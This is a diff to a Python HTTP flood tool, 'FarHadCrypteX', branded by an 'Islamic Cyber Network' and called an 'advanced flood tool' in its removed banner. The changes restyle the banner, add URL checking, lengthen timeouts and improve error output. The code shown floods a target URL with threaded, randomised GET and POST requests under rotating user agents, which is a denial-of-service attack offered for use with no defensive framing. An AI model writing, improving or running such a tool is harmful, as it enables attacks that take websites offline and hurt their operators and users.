@@ -11,28 +11,12 @@ from colorama import Fore, init
 init(autoreset=True)
 os.system('clear')
 
-print('''
-< Islamic Cyber Network >
-      !!!!!!!
-     ^~~!!!~~^
-    ^$$$nWxl!         <!!IUW$$$^
-   $$$$$#MWX!        $$$$$$$$$$
- ^$$$$$b  $$$UX      $$$$$$$$$$
- ^$$$b    $$$$^      d$$R   d$$R
-   *$bd$$$*          $$$$so~#
-   
-███████╗ █████╗ ██████╗ ██╗  ██╗ █████╗ ██████╗     
-██╔════╝██╔══██╗██╔══██╗██║ ██╔╝██╔══██╗██╔══██╗    
-█████╗  ███████║██████╔╝█████╔╝ ███████║██║  ██║    
-██╔══╝  ██╔══██║██╔═══╝ ██╔═██╗ ██╔══██║██║  ██║    
-██║     ██║  ██║██║     ██║  ██╗██║  ██║██████╔╝    
-╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝     
-
-     FarHad–CrypteX  |  Islamic Cyber Network
-
+print(Fore.CYAN + '''
+╔═════════════════════════════════════════════════╗
+║               Islamic Cyber Network             ║
+║             FarHad–CrypteX Tool v2.0            ║
+╚═════════════════════════════════════════════════╝
 ''')
-
-print("FARHAD CRYPTEX - ADVANCED FLOOD TOOL v2.0")
 
 if len(sys.argv) < 3:
     print(Fore.YELLOW + "Usage: python3 FarHadCrypteX.py <url> <threads>")
@@ -40,6 +24,10 @@ if len(sys.argv) < 3:
 
 url = sys.argv[1]
 threads = int(sys.argv[2])
+
+if not url.startswith("http://") and not url.startswith("https://"):
+    print(Fore.RED + "Error: URL must start with http:// or https://")
+    sys.exit()
 
 user_agents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
@@ -69,17 +57,20 @@ def attack():
             }
             params = {random_string(5): random_string(8) for _ in range(3)}
             data = {random_string(5): random_string(8) for _ in range(3)}
+
             if method == 'GET':
-                r = session.get(url, headers=headers, params=params, timeout=5)
+                r = session.get(url, headers=headers, params=params, timeout=10)
             else:
-                r = session.post(url, headers=headers, data=data, timeout=5)
+                r = session.post(url, headers=headers, data=data, timeout=10)
+
             with lock:
                 success += 1
                 print(Fore.GREEN + f"[+] Sent {success} | Code: {r.status_code}")
-        except:
+
+        except Exception as e:
             with lock:
                 failed += 1
-                print(Fore.RED + f"[-] Failed {failed}")
+                print(Fore.RED + f"[-] Failed {failed} | Error: {str(e)}")
 
 def stats():
     while True:
